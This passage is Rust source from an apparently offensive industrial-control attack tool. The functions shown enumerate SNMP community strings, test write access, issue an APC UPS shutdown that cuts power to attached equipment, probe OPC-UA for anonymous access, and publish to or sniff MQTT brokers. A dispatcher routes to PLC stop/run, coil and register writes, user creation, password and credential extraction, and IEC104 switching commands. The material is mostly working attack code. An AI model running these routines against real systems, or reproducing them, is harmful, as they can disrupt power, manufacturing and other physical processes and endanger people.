        if let Ok(val) = client::get(ip, p, c, oids::SYS_DESCR) {
            out(&format!(
                "  [+] community={c:<12}  sysDescr={}",
                val.display()
            ));
            found += 1;
        }
    }
    if found == 0 {
        out("[-] No community strings responded");
    } else {
        out(&format!("[+] {found} community string(s) found"));
    }
}

pub fn exploit_snmp_cve_probe(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
    let community_owned;
    let community = if input.trim().is_empty() {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    } else {
        input.trim()
    };
    match enumerate::get_system_info(ip, p, community) {
        Ok(info) => {
            out(&format!("  sysDescr = {}", info.descr));
            out(&format!("  sysOID   = {}", info.object_id));
            let hits = enumerate::check_cves(&info);
            if hits.is_empty() {
                out("[*] No known CVE patterns matched");
            } else {
                for h in &hits {
                    out(&format!("  [{}] CVSS:{} {}", h.id, h.cvss, h.summary));
                    out(&format!("         ref: {}", h.ref_url));
                }
                out(&format!("[!] {} advisory match(es)", hits.len()));
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::client;
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let (root, user_community) = match input.trim().rsplit_once(' ') {
        Some((oid, comm)) if !comm.trim().is_empty() => (oid.trim(), Some(comm.trim())),
        _ => {
            let raw = input.trim();
            (if raw.is_empty() { "1.3.6.1.2.1.1" } else { raw }, None)
        }
    };
    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
    let community_owned;
    let community = if let Some(c) = user_community {
        c
    } else {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    };
    match client::walk(ip, p, community, root) {
        Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
        Ok(entries) => {
            for (o, v) in &entries {
                out(&format!("  {o} = {}", v.display()));
            }
            out(&format!("[+] {} object(s)", entries.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let community = if input.trim().is_empty() {
        "private"
    } else {
        input.trim()
    };
    out(&format!(
        "[*] SNMP write test on {ip}:{p} with community='{community}'..."
    ));
    match client::get(ip, p, "public", oids::SYS_NAME) {
        Ok(current) => {
            let name_str = current.display();
            out(&format!("  current sysName = {name_str}"));
            let val = client::SnmpValue::OctetString(name_str.into_bytes());
            match client::set(ip, p, community, oids::SYS_NAME, &val) {
                Ok(_) => out("[+] Write confirmed: community string has write access"),
                Err(e) => out(&format!("[-] Write rejected: {e}")),
            }
        }
        Err(e) => out(&format!("[-] Could not read sysName: {e}")),
    }
}

pub fn exploit_snmp_apc_status(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] APC UPS status from {ip}:{p}..."));
    let community_owned;
    let community = if input.trim().is_empty() {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    } else {
        input.trim()
    };
    let apc_oids = [
        oids::APC_MODEL,
        oids::APC_FIRMWARE,
        oids::APC_SERIAL,
        oids::APC_BATTERY_STATUS,
        oids::APC_RUNTIME_MINS,
        oids::APC_INPUT_VOLTAGE,
        oids::APC_OUTPUT_LOAD_PCT,
        oids::APC_OUTPUT_STATUS,
    ];
    let labels = [
        "Model",
        "Firmware",
        "Serial",
        "Battery",
        "Runtime(min)",
        "InputV",
        "Load%",
        "OutStatus",
    ];
    match client::get_multi(ip, p, community, &apc_oids) {
        Ok(results) => {
            for (i, (_, val)) in results.iter().enumerate() {
                out(&format!("  {:<14} = {}", labels[i], val.display()));
            }
            let bat = results.get(3).and_then(|(_, v)| v.as_int()).unwrap_or(0);
            if bat != 2 {
                out("[!] Battery status is NOT normal (2=normal)");
            }
            out("[+] APC status retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    let community = if input.trim().is_empty() {
        "private"
    } else {
        input.trim()
    };
    out(&format!(
        "[!] APC graceful shutdown on {ip}:{p} with community='{community}'"
    ));
    out("[!] This will cut power to attached equipment after the UPS delay.");
    match client::set(
        ip,
        p,
        community,
        oids::APC_CMD_GRACEFUL_OFF,
        &client::SnmpValue::Integer(2),
    ) {
        Ok(_) => out("[+] Graceful shutdown command accepted: equipment will lose power"),
        Err(e) => out(&format!("[-] Command rejected: {e}")),
    }
}

// ─── BACnet inline exploits ───────────────────────────────────────────────────

pub fn exploit_bacnet_info(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::bacnet::client as bacnet;
    if let Some(dev) = bacnet::scan_ip(ip, 5) {
        out(&format!("Instance ID : {}", dev.instance_id));
        out(&format!(
            "Vendor      : {} (ID {})",
            dev.vendor_name, dev.vendor_id
        ));
        out(&format!("Object Name : {}", dev.object_name));
        out(&format!("Description : {}", dev.description));
        out(&format!("Firmware    : {}", dev.firmware_revision));
        out(&format!("Max APDU    : {}", dev.max_apdu));
    } else {
        out("No BACnet device responded");
    }
}

pub fn exploit_bacnet_read_props(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::bacnet::client as bacnet;
    let timeout = Duration::from_secs(5);
    if let Some(dev) = bacnet::scan_ip(ip, 5) {
        let prop_ids = [
            (bacnet::PROP_OBJECT_NAME, "Object-Name"),
            (bacnet::PROP_DESCRIPTION, "Description"),
            (bacnet::PROP_FIRMWARE_REVISION, "Firmware-Revision"),
            (bacnet::PROP_VENDOR_NAME, "Vendor-Name"),
            (bacnet::PROP_VENDOR_IDENTIFIER, "Vendor-Identifier"),
        ];
        for (prop_id, label) in prop_ids {
            if let Some(val) = bacnet::read_property(ip, dev.instance_id, prop_id, timeout) {
                out(&format!("{label}: {val}"));
            }
        }
    } else {
        out("No BACnet device responded");
    }
}

pub fn exploit_bacnet_who_is(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::bacnet::client as bacnet;
    let timeout = Duration::from_secs(5);
    let _ = ip;
    let devices = bacnet::who_is_broadcast(timeout);
    if devices.is_empty() {
        out("No BACnet devices found on broadcast");
    } else {
        out(&format!("Found {} device(s):", devices.len()));
        for dev in &devices {
            out(&format!(
                "  {} — instance {} vendor_id {}",
                dev.ip, dev.instance_id, dev.vendor_id
            ));
            if !dev.object_name.is_empty() {
                out(&format!("    Name: {}", dev.object_name));
            }
        }
    }
}

// ─── DNP3 inline exploits ─────────────────────────────────────────────────────

pub fn exploit_dnp3_attrs(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::dnp3::client as dnp3;
    let timeout = Duration::from_secs(5);
    let attrs = dnp3::read_device_attributes_with_port(ip, port, timeout);
    if attrs.is_empty() {
        out("No device attributes returned (device may not support group 0)");
    } else {
        let mut pairs: Vec<_> = attrs.iter().collect();
        pairs.sort_by_key(|(k, _)| k.as_str());
        for (k, v) in pairs {
            out(&format!("{k}: {v}"));
        }
    }
}

pub fn exploit_dnp3_integrity(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::dnp3::client as dnp3;
    let timeout = Duration::from_secs(5);
    let lines = dnp3::read_integrity_poll(ip, timeout);
    if lines.is_empty() {
        out("No integrity poll response received");
    } else {
        out(&format!("Received {} frame(s):", lines.len()));
        for l in &lines {
            out(l);
        }
    }
}

// ─── OPC-UA inline exploits ───────────────────────────────────────────────────

pub fn exploit_opcua_info(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::opcua::client as opcua;
    let timeout = Duration::from_secs(5);
    if let Some(server) = opcua::detect(ip, 4840, timeout) {
        let endpoints = opcua::get_endpoints(ip, 4840, timeout);
        out(&format!("IP          : {}", server.ip));
        out(&format!("Port        : {}", server.port));
        out(&format!("Endpoints   : {}", endpoints.len()));
        let anon = endpoints
            .iter()
            .any(|e| e.allows_anonymous && e.security_mode == "None");
        out(&format!(
            "Anon access : {}",
            if anon {
                "YES — unauthenticated access possible"
            } else {
                "No"
            }
        ));
        let modes: std::collections::HashSet<_> =
            endpoints.iter().map(|e| e.security_mode.as_str()).collect();
        let mut modes_v: Vec<_> = modes.into_iter().collect();
        modes_v.sort_unstable();
        out(&format!("Sec modes   : {}", modes_v.join(", ")));
    } else {
        out("No OPC-UA server responded (port 4840)");
    }
}

pub fn exploit_opcua_endpoints(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::opcua::client as opcua;
    let timeout = Duration::from_secs(5);
    let endpoints = opcua::get_endpoints(ip, 4840, timeout);
    if endpoints.is_empty() {
        out("No endpoints returned — server may require a different port or security policy");
    } else {
        for (i, ep) in endpoints.iter().enumerate() {
            out(&format!("[{i}] {}", ep.url));
            out(&format!("    Security policy : {}", ep.security_policy));
            out(&format!("    Security mode   : {}", ep.security_mode));
            out(&format!("    Anonymous auth  : {}", ep.allows_anonymous));
        }
    }
}

pub fn exploit_opcua_anon_check(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::opcua::client as opcua;
    let timeout = Duration::from_secs(5);
    let endpoints = opcua::get_endpoints(ip, 4840, timeout);
    let vuln: Vec<_> = endpoints
        .iter()
        .filter(|e| e.allows_anonymous && e.security_mode == "None")
        .collect();
    if vuln.is_empty() {
        out("No None-security anonymous endpoints found");
        out("All endpoints require authentication or encryption");
    } else {
        out(&format!(
            "[VULN] Found {} anonymous endpoint(s):",
            vuln.len()
        ));
        for ep in &vuln {
            out(&format!("  [VULN] {}", ep.url));
            out("  Anonymous connect allowed with no encryption");
        }
    }
}

// ─── MQTT inline exploits ─────────────────────────────────────────────────────

pub fn exploit_mqtt_publish(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mqtt::session::{ConnectOptions, MqttSession};
    let (topic, payload_str) = input.split_once(':').unwrap_or((input, ""));
    let mqtt_port = if port == 0 {
        casket::vendors::mqtt::client::MQTT_PORT
    } else {
        port
    };
    let opts = ConnectOptions {
        host: ip.to_string(),
        port: mqtt_port,
        client_id: "scadaver-pub".to_string(),
        ..Default::default()
    };
    out(&format!("Publishing to '{topic}' on {ip}:{mqtt_port}…"));
    match MqttSession::connect(&opts)
        .and_then(|mut sess| sess.publish(topic, payload_str.as_bytes(), 0, false))
    {
        Ok(()) => out(&format!(
            "Published {} byte(s) to '{topic}'.",
            payload_str.len()
        )),
        Err(e) => out(&format!("Error: {e}")),
    }
}

pub fn exploit_mqtt_scan(ip: &str, port: u16, out: &dyn Fn(&str)) -> Vec<String> {
    use casket::vendors::mqtt::session::{ConnectOptions, MqttSession};
    let mqtt_port = if port == 0 {
        casket::vendors::mqtt::client::MQTT_PORT
    } else {
        port
    };
    let opts = ConnectOptions {
        host: ip.to_string(),
        port: mqtt_port,
        client_id: "scadaver-scan".to_string(),
        ..Default::default()
    };
    out(&format!(
        "Subscribing to all topics on {ip}:{mqtt_port} for 2 s…"
    ));
    match MqttSession::connect(&opts).and_then(|mut sess| {
        sess.subscribe("#", 0)?;
        std::thread::sleep(Duration::from_secs(2));
        Ok(sess.drain_messages())
    }) {
        Ok(msgs) => {
            let mut topics: Vec<String> = msgs.iter().map(|m| m.topic.clone()).collect();
            topics.sort();
            topics.dedup();
            for t in &topics {
                out(&format!("  {t}"));
            }
            out(&format!("{} topic(s).", topics.len()));
            topics
        }
        Err(e) => {
            out(&format!("Error: {e}"));
            vec![]
        }
    }
}

// ─── Action dispatcher ────────────────────────────────────────────────────────

/// Shared exploit dispatcher for CLI, TUI, and Web surfaces.
/// `id` is "vendor/index" e.g. "beckhoff/0". Returns true if a handler matched.
/// `stored_password` is pre-loaded from the device DB by the caller for Siemens exploits.
#[allow(clippy::too_many_lines)]
pub fn run_action(
    id: &str,
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) -> bool {
    let Some((vendor, idx_str)) = id.trim_start_matches('/').split_once('/') else {
        return false;
    };
    let Ok(idx) = idx_str.parse::<usize>() else {
        return false;
    };
    match (vendor, idx) {
        ("beckhoff", 0) => exploit_beckhoff_info(ip, port, out),
        ("beckhoff", 1) => exploit_beckhoff_state(ip, port, "run", out),
        ("beckhoff", 2) => exploit_beckhoff_state(ip, port, "config", out),
        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, port, out),
        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, port, input, out),
        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, port, out),
        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, port, input, out),
        ("siemens", 0) => exploit_siemens_cpu(ip, port, input, stored_password, out),
        ("siemens", 1) => exploit_siemens_io(ip, port, input, stored_password, out),
        ("siemens", 2) => exploit_siemens_toggle(ip, port, input, stored_password, out),
        ("siemens", 3) => exploit_siemens_set_outputs(ip, port, input, stored_password, out),
        ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, stored_password, out),
        ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, stored_password, out),
        ("siemens", 6) => exploit_siemens_read_db(ip, port, input, stored_password, out),
        ("siemens", 7) => exploit_siemens_write_db(ip, port, input, stored_password, out),
        ("schneider" | "modicon", 0) => exploit_schneider_flash(ip, out),
        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, input, out),
        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", input, out),
        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", input, out),
        ("schneider" | "modicon", 4) | ("modbus", 0) => exploit_modbus_map(ip, port, "quick", out),
        ("schneider" | "modicon", 5) | ("modbus", 1) => exploit_modbus_map(ip, port, "common", out),
        ("schneider" | "modicon", 6) | ("modbus", 2) => exploit_modbus_map(ip, port, input, out),
        ("schneider" | "modicon", 7) | ("modbus", 3) => exploit_modbus_map(ip, port, "all", out),
        ("schneider" | "modicon", 8) | ("modbus", 4) => {
            exploit_modbus_holding(ip, port, input, out)
        }
        ("schneider" | "modicon", 9) | ("modbus", 5) => exploit_modbus_coils(ip, port, input, out),
        ("schneider" | "modicon", 10) | ("modbus", 6) => exploit_modbus_input(ip, port, input, out),
        ("schneider" | "modicon", 11) | ("modbus", 7) => {
            exploit_modbus_discrete(ip, port, input, out)
        }
        ("schneider" | "modicon", 12) | ("modbus", 8) => {
            exploit_modbus_write_coil(ip, port, input, out)
        }
        ("schneider" | "modicon", 13) | ("modbus", 9) => {
            exploit_modbus_write_register(ip, port, input, out)
        }
        ("schneider" | "modicon", 14) | ("modbus", 10) => {
            exploit_modbus_write_registers(ip, port, input, out)
        }
        ("schneider" | "modicon", 15) => exploit_fc90_stop(ip, port, out),
        ("schneider" | "modicon", 16) => exploit_fc90_start(ip, port, out),
        ("schneider" | "modicon", 17) => exploit_fc90_stop_tm221(ip, port, out),
        ("schneider" | "modicon", 18) => exploit_fc90_start_tm221(ip, port, out),
        ("schneider" | "modicon", 19) => exploit_fc90_force(ip, port, input, out),
        ("phoenix", 0) => exploit_phoenix_passwords(ip, port, out),
        ("phoenix", 1) => {
            let _ = exploit_phoenix_list_tags(ip, port, out);
        }
        ("phoenix", 2) => {
            let _ = exploit_phoenix_read_tags(ip, port, out);
        }
        ("phoenix", 3) => exploit_phoenix_write_tag(ip, port, input, out),
        ("phoenix", 4) => exploit_phoenix_info(ip, port, out),
        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, port, input, out),
        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, port, input, out),
        ("ewon", 0) => exploit_ewon_creds(ip, port, input, out),
        ("ewon", 1) => {
            let _ = exploit_ewon_tags(ip, port, out);
        }
        ("rockwell" | "enip", 0) => exploit_rockwell_identity(ip, port, out),
        ("rockwell" | "enip", 1) => {
            let _ = exploit_rockwell_tags(ip, port, out);
        }
        ("rockwell" | "enip", 2) => exploit_rockwell_read(ip, port, input, out),
        ("rockwell" | "enip", 3) => exploit_rockwell_write(ip, port, input, out),
        ("mitsubishi", 0) => exploit_mitsubishi_info(ip, out),
        ("mitsubishi", 1) => exploit_slmp_map(ip, port, "quick", out),
        ("mitsubishi", 2) => exploit_slmp_map(ip, port, "common", out),
        ("mitsubishi", 3) => exploit_slmp_map(ip, port, input, out),
        ("mitsubishi", 4) => exploit_slmp_map(ip, port, "all", out),
        ("mitsubishi", 5) => exploit_mitsubishi_state(ip, "run", out),
        ("mitsubishi", 6) => exploit_mitsubishi_state(ip, "stop", out),
        ("mitsubishi", 7) => exploit_mitsubishi_set_pause(ip, out),
        ("mitsubishi", 8) => exploit_mitsubishi_read_d(ip, port, input, out),
        ("mitsubishi", 9) => exploit_mitsubishi_read_m(ip, port, input, out),
        ("mitsubishi", 10) => exploit_slmp_write_d(ip, port, input, out),
        ("mitsubishi", 11) => exploit_slmp_write_m(ip, port, input, out),
        ("omron", 0) => exploit_omron_info(ip, port, out),
        ("omron", 1) => exploit_omron_read_dm(ip, port, input, out),
        ("omron", 2) => exploit_omron_write_dm(ip, port, input, out),
        ("omron", 3) => exploit_omron_cpu_status(ip, port, out),
        ("omron", 4) => exploit_omron_cpu_run(ip, port, out),
        ("omron", 5) => exploit_omron_cpu_stop(ip, port, out),
        ("iec104", 0) => exploit_iec104_gi(ip, port, out),
        ("iec104", 1) => exploit_iec104_sc_on(ip, port, input, out),
        ("iec104", 2) => exploit_iec104_sc_off(ip, port, input, out),
        ("iec104", 3) => exploit_iec104_dc(ip, port, input, out),
        ("snmp", 0) => exploit_snmp_sys_info(ip, port, input, out),
        ("snmp", 1) => exploit_snmp_interfaces(ip, port, input, out),
        ("snmp", 2) => exploit_snmp_topology(ip, port, input, out),
        ("snmp", 3) => exploit_snmp_community_scan(ip, port, out),
        ("snmp", 4) => exploit_snmp_cve_probe(ip, port, input, out),
        ("snmp", 5) => exploit_snmp_walk(ip, port, input, out),
        ("snmp", 6) => exploit_snmp_test_write(ip, port, input, out),
        ("snmp", 7) => exploit_snmp_apc_status(ip, port, input, out),
        ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, out),
        ("bacnet", 0) => exploit_bacnet_info(ip, out),
        ("bacnet", 1) => exploit_bacnet_read_props(ip, out),
        ("bacnet", 2) => exploit_bacnet_who_is(ip, out),
        ("dnp3", 0) => exploit_dnp3_attrs(ip, port, out),
        ("dnp3", 1) => exploit_dnp3_integrity(ip, out),
        ("opcua", 0) => exploit_opcua_info(ip, out),
        ("opcua", 1) => exploit_opcua_endpoints(ip, out),
        ("opcua", 2) => exploit_opcua_anon_check(ip, out),
        ("mqtt", 0) => exploit_mqtt_publish(ip, port, input, out),
        ("mqtt", 1) => {
            let _ = exploit_mqtt_scan(ip, port, out);
        }
        _ => return false,
    }
    true
}

/// Translates a human-readable exploit ID to the numeric `run_action` ID.
///
/// Callers that use descriptive names (e.g. the web layer's string IDs) can
/// pass the result of this function directly to `run_action`.  IDs that are
/// already numeric, or that have no mapping, are returned unchanged.
#[allow(dead_code)] // used by integration tests; not called from the binary
pub fn action_id_from_name(name: &str) -> &str {
    match name.trim_start_matches('/') {
        // Beckhoff ADS
        "beckhoff/info" => "beckhoff/0",
        "beckhoff/state_run" => "beckhoff/1",
        "beckhoff/state_config" => "beckhoff/2",
        "beckhoff/reboot" => "beckhoff/3",
        "beckhoff/add_user" => "beckhoff/4",
        "beckhoff/get_state" => "beckhoff/5",
        "beckhoff/write_symbol" => "beckhoff/8",
        // Siemens S7Comm
        "siemens/cpu_state" => "siemens/0",
        "siemens/io" => "siemens/1",
        "siemens/toggle" => "siemens/2",
        "siemens/set_outputs" => "siemens/3",
        "siemens/set_merkers" => "siemens/4",
        "siemens/list_dbs" => "siemens/5",
        "siemens/read_db" => "siemens/6",
        "siemens/write_db" => "siemens/7",
        // Schneider / Modicon
        "schneider/flash" => "schneider/0",
        "schneider/session_info" => "schneider/1",
        "schneider/session_stop" => "schneider/2",
        "schneider/session_run" => "schneider/3",
        "schneider/fc90_stop" => "schneider/15",
        "schneider/fc90_start" => "schneider/16",
        "schneider/fc90_stop_tm221" => "schneider/17",
        "schneider/fc90_start_tm221" => "schneider/18",
        "schneider/fc90_force" => "schneider/19",
        // Modbus
        "modbus/map-quick" | "modbus/map_quick" => "modbus/0",
        "modbus/map-common" | "modbus/map_common" => "modbus/1",
        "modbus/map-custom" | "modbus/map_custom" => "modbus/2",
        "modbus/map-all" | "modbus/map_all" => "modbus/3",
        "modbus/holding" => "modbus/4",
        "modbus/coils" => "modbus/5",
        "modbus/input_regs" | "modbus/input-regs" => "modbus/6",
        "modbus/discrete" => "modbus/7",
        "modbus/write_coil" | "modbus/write-coil" | "modicon/write_coil" => "modbus/8",
        "modbus/write_reg" | "modbus/write-reg" | "modicon/write_register" => "modbus/9",
        "modbus/write_regs" | "modbus/write-regs" => "modbus/10",
        // Phoenix Contact
        "phoenix/passwords" => "phoenix/0",
        "phoenix/list_tags" => "phoenix/1",
        "phoenix/read_tags" => "phoenix/2",
        "phoenix/write_tag" => "phoenix/3",
        "phoenix/info" => "phoenix/4",
        // eWON
        "ewon/creds" => "ewon/0",
        "ewon/tags" => "ewon/1",
        // Rockwell EtherNet/IP
        "rockwell/identity" => "rockwell/0",
        "rockwell/list_tags" => "rockwell/1",
        "rockwell/read" => "rockwell/2",
        "rockwell/write" => "rockwell/3",
        // Mitsubishi SLMP
        "mitsubishi/info" => "mitsubishi/0",
        "mitsubishi/map-quick" => "mitsubishi/1",
        "mitsubishi/read_d" | "mitsubishi/read-d" => "mitsubishi/8",
        "mitsubishi/read_m" | "mitsubishi/read-m" => "mitsubishi/9",
        // Omron FINS
        "omron/info" => "omron/0",
        "omron/read_dm" => "omron/1",
        "omron/write_dm" => "omron/2",
        "omron/cpu_status" => "omron/3",
        "omron/cpu_run" => "omron/4",
        "omron/cpu_stop" => "omron/5",
        // IEC 60870-5-104
        "iec104/gi" => "iec104/0",
        "iec104/sc_on" => "iec104/1",
        "iec104/sc_off" => "iec104/2",
        "iec104/dc" => "iec104/3",
        // SNMP
        "snmp/sys_info" => "snmp/0",
        "snmp/interfaces" => "snmp/1",
        "snmp/topology" => "snmp/2",
        "snmp/community_scan" => "snmp/3",
        "snmp/cve_probe" => "snmp/4",
        "snmp/walk" => "snmp/5",
        "snmp/test_write" => "snmp/6",
        "snmp/apc_status" => "snmp/7",
        "snmp/apc_shutdown" => "snmp/8",
        // BACnet/IP
        "bacnet/info" => "bacnet/0",
        "bacnet/read_props" => "bacnet/1",
        "bacnet/who_is" => "bacnet/2",
        // DNP3
        "dnp3/attrs" => "dnp3/0",
        "dnp3/integrity" => "dnp3/1",
        // OPC-UA
        "opcua/info" => "opcua/0",
        // MQTT
        "mqtt/publish" => "mqtt/0",
        "mqtt/subscribe" => "mqtt/1",
        // Pass-through: already numeric or unknown
        other => other,
    }
}
